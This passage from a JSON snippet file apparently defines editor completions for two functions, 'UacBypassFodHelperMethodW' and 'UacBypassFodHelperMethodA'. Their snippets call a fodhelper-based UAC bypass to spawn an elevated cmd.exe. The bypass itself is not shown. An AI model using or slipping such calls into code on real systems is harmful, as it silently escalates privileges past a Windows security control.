      "allowMultiple": false,
      "items": [
        {
          "id": "UacBypassFodHelperMethodW",
          "display": "UacBypassFodHelperMethodW",
          "snippet": "PROCESS_INFORMATION pi{};\nif (UacBypassFodHelperMethodW(L\"C:\\Windows\\System32\\cmd.exe\", &pi))\n{\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    return 1;\n}"
        },
        {
          "id": "UacBypassFodHelperMethodA",
          "display": "UacBypassFodHelperMethodA",
          "snippet": "PROCESS_INFORMATION pi{};\nif (UacBypassFodHelperMethodA(\"C:\\Windows\\System32\\cmd.exe\", &pi))\n{\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    return 1;\n}"
